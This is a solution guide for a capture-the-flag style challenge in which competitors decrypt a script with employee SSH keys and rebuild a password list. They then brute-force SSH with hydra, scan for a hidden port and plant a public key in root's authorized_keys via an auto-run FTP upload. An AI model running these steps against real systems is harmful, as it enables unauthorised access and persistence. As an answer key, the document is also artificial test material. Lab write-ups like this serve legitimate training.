# Where Did I Put My Keys?

_Solution Guide_

## Overview 

_Where Did I Put My Keys?_ is an incident response challenge where competitors must regain access to a compromised system. It involves writing various scripts to create a wordlist and retrieve SSH keys.

## Question 1

_Which user's key was used to encrypt the script?_

1. Log in to `kali-workstation` (wait a few minutes for start-up scripts to complete).
2. Access the ftp server at `ftp ftp-server.us` with the credentials `user:tartans`.
3. Files will be found within the **files** directory: `encrypted.enc`, `rsa_key.enc`, `wordlist.txt`, and a directory called **keys** containing all of the SSH keys for each employee (150 directories each containing `id_rsa` and `id_rsa.pub` files).
4. Open a new terminal and download all of the files from the directory using the command `wget -r -m ftp://user:tartans@ftp-server.us`. This will create a directory called **ftp-server.us** containing all of these files.
5. Since we do not know which user's key pair was used to generate the encryption, a script will be needed to try the decryption for every user. Create this script in the **/home/user** directory.
``` 
bash
    #!/bin/bash
    
    for user in ftp-server.us/files/keys/*
    do
        chmod 600 $user/id_rsa
        ssh-keygen -p -m PEM -N "" -f $user/id_rsa
        openssl rsautl -decrypt -oaep -inkey $user/id_rsa -in ftp-server.us/files/rsa_key.enc -out rsa_key.keygen
        openssl aes-256-cbc -d -in ftp-server.us/files/encrypted.enc -out $user.py -pass file:rsa_key.keygen
    
    done
```
6. Running this script (permissions may need to be changed with `sudo chmod +x script.sh`) will create a script called `user##.py` within **/home/user/ftp-server.us/files/keys/** that contains the code the attacker used to generate the password. This user is the answer to Question 1.

## Question 2

_What is the token found on the ftp server?_

1. Look at the code. The password was generated using the wordlist provided on the **Desktop** of `kali-workstation`.
	- Each word in the list was sorted by the sum of each letter's unicode value minus the time the script was executed (August 16, as per the challenge guide). 
	- Two words were appended together based on the index of the word and the Unicode value of the first letter of the word to create a sublist of 500 words.
	- One of these 500 words was chosen as the password.
	
	  Since the script was encrypted and downloaded, the original metadata has been overwritten so the script will not run properly as is.

2. Comment out the part of the script where the variable `sort_val` was generated (lines 14-18) and manually change the `sort_val` to when the script was thought to have been run: `August 16th` or `816`

3. Because only one password was chosen at random, we will need to store the entire sublist by changing the last line to:

`open("/home/user/passwd_gen", "w").write("\n".join(choices))`

​	The final edited script should look like the following:

``` 
    python
    import os, time, datetime, random
    
    def ord_sum(word):
        ord_val = 0
        for letter in word:
            ord_val += ord(letter)
    
        return ord_val
    
    choices = []
    
    #path = r"/home/user/genNewPass.py"
    
    #date = datetime.datetime.strptime(time.ctime(os.path.getmtime(path)), "%a %b %d %H:%M:%S %Y")
    
    #sort_val = int(str(date.month)+str(date.day))
    
    sort_val = 816
    
    words = open("/home/user/wordlist.txt", "r").read().splitlines()
    
    words.sort(key=lambda x: abs(ord_sum(x) - sort_val))
    
    for i in range(1, 501):
        choices.append(words[i] + words[ord(words[i][0])*(i//10)])
    
    open("/home/user/passwd_gen", "w").write("\n".join(choices))
```

6. Before executing the script, the permissions may need to be changed using `sudo chmod +x user##.py`. Also, move `/home/user/ftp-server.us/files/wordlist.txt` to the **/home/user/** directory.
7. Once the wordlist is generated, use a program (such as `hydra`) to try and brute force into `10.5.5.101` with each password:
`hydra -l user -P /home/user/passwd_gen 10.5.5.101 ssh`.
8. Once hydra finds the password, log in to `10.5.5.101` with the found password.
9. On the **Desktop**, you will be able to find the credentials for the `remote-user` on the FTP server: `remote-user:d0nTm4kEy0Urp45sW0rdPAs5woRd`. After logging in to this user and navigating to the **files** directory, you will see a `README` that will contain the second token.

## Question 3

_What is the token found on 10.5.5.128?_

1. Any bash or python files uploaded to the **files** directory of this user will automatically run. Keep in mind that the FTP server has SSH access to the final target machine.
2. When attempting to log in to the final target machine, we will find that port 22 is no longer being used for SSH access for security reasons. To find the correct port, run: `nmap -p- 10.5.5.128`. Be sure to keep track of this port.
3. Attempting to log in to the final target machine with the correct port will now yield a `Permission denied (publickey)` error, and since we know that the final machine only accepts SSH access via a `root` account, we will need to find a way to upload the public key of a `root` account to the final machine.
4. First, we need to get the key found in the `ssh-access` machine's `root` ssh folder.
5. From the **/root/.ssh** directory, copy either key to the **user** directory with `cp id_rsa.pub /home/user/` and upload it to the ftp server by:
	- Connecting to `ftp ftp-server.us` with the credentials `remote-user:d0nTm4kEy0Urp45sW0rdPAs5woRd`
	- `cd files`
	- `put id_rsa.pub`

6. We can now write a script to append that key to the final machine's **authorized_keys** folder, which can be run by uploading to the `remote-user`'s FTP directory.
7. One possible solution is to write a script like the following:

``` 
bash
    #!/bin/bash
    
    sudo scp -P [ENTER PORT] /home/remote-user/ftp/files/id_rsa.pub root@10.5.5.128:/tmp/id_user
    sudo ssh -p [ENTER PORT] root@10.5.5.128 'cat /tmp/id_user >> /root/.ssh/authorized_keys'
```
This will copy the key from the remote-user's directory into a tmp file in the target machine, then append that key into the machine's `authorized_keys` file.

8. Uploading the script using the same method as the key upload in `step 5` will allow access from the `root` account.
9. `sudo su` into the root account, then `ssh -p [ENTER PORT] root@10.5.5.128` and navigate to the **Desktop**. `cat` out the `token.txt` file to receive the final token.
